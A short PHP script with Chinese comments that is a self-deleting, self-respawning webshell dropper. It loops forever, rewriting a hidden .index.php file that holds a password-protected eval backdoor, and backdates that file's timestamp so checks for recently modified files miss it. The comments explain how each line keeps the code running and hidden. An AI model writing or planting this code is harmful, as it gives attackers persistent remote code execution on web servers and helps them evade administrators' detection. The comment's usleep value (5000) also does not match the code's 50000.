<?php 
ignore_user_abort(true);
set_time_limit(0);
unlink(__FILE__);
$file = './.index.php';
$code = '<?php if(md5($_POST["pass"])=="3a50065e1709acc47ba0c9238294364f"){@eval($_POST[a]);} ?>';
while (1){
	file_put_contents($file,$code);
	system('touch -m -d "2020-01-02 15:20:54" .index.php');
	usleep(50000);
}
?>

/*
注：
    ignore_user_abort(true);
    函数设置与客户机断开是否会终止脚本的执行。这里设置为true则忽略与用户的断开，即使与客户机断开脚本仍会执行。
    set_time_limit()
    函数设置脚本最大执行时间。这里设置为0，即没有时间方面的限制。
    unlink(__FILE__)
    删除文件本身，以起到隐蔽自身的作用。
    while
    循环内每隔usleep(5000)即写新的后门文件
    system()
    执行的命令用于修改文件的创建或修改时间，可以绕过“find –name '*.php' –mmin -10”命令检测最近10分钟修改或新创建的PHP文件，但不一定有用，可选。

*/